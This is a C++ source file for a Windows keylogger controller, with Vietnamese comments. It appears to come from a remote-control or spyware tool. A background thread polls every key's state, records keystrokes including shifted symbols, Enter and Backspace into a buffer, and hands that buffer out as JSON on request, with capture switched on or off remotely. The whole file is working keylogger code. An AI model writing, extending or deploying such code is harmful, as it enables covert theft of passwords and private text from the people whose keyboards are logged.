// controllers/KeylogController.cpp
#include "KeylogController.h"
#include "../utils/helpers.h"
#include <windows.h>
#include <mutex>
#include <atomic>
#include <thread>
#include <sstream>

using namespace std;

// --- State (trang thai) rieng cua Keylogger (static) ---
static string keylogBuffer = "";
static mutex logMutex;
static atomic<bool> keylogEnabled(false);

/**
 * @brief Ham chay trong luong rieng biet de bat ban phim.
 */
static void KeyLogger()
{
    while (true)
    {
        if (!keylogEnabled.load())
        {
            Sleep(200);
            continue;
        }
        Sleep(10);
        for (int i = 1; i < 256; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                lock_guard<mutex> lock(logMutex);
                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001);
                if (i >= 65 && i <= 90)
                    keylogBuffer += shift ? (char)i : (char)(i + 32);
                else if (i >= 48 && i <= 57)
                {
                    string s = ")!@#$%^&*(";
                    keylogBuffer += shift ? s[i - 48] : (char)i;
                }
                else if (i == VK_SPACE)
                    keylogBuffer += " ";
                else if (i == VK_RETURN)
                    keylogBuffer += "\n[ENTER]\n";
                else if (i == VK_BACK)
                    keylogBuffer += "[BS]";
                else if (i == VK_TAB)
                    keylogBuffer += "[TAB]";
                else if (i == VK_OEM_PERIOD)
                    keylogBuffer += shift ? ">" : ".";
                // (Co the them cac phim OEM khac neu can)
            }
        }
    }
}

// --- Public Handlers ---

void KeylogController::startKeyLoggerThread()
{
    thread(KeyLogger).detach();
}

string KeylogController::getKeylog()
{
    lock_guard<mutex> lock(logMutex);
    string safeLog = jsonEscape(keylogBuffer);
    // --- SUA LOI: Khong them 'command' hay 'payload' ---
    string json = "{\"log\":\"" + safeLog + "\", \"enabled\":" + (keylogEnabled.load() ? "true" : "false") + "}";
    keylogBuffer = "";
    return json;
}

void KeylogController::setKeylog(bool enabled)
{
    keylogEnabled.store(enabled);
}